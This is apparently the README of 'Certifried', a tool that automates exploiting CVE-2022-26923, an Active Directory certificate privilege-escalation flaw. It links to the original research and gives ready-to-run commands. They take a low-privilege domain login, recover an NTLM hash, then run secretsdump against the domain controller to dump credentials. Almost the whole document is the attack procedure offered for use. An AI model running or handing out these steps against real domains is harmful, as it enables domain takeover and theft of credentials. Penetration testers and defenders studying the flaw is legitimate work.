# Certifried 

## Why Certifried?
Certifried makes steps easier to replicate to abuse the new CVE-2022-26923. However below is the manual steps to replicate the vulnerability. Detailed article can be read [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) from the original author.

## Usage
1. Recover NTLM hash
```
python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -use-ldap
```
2. Proceed with secretsdump
```
python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -computer-name 'ControlledComputer' -computer-pass 'Password123' -use-ldap -dump
```
_Note: If you received an error of Name Service not found, you might wanna add target ip to /etc/hosts_
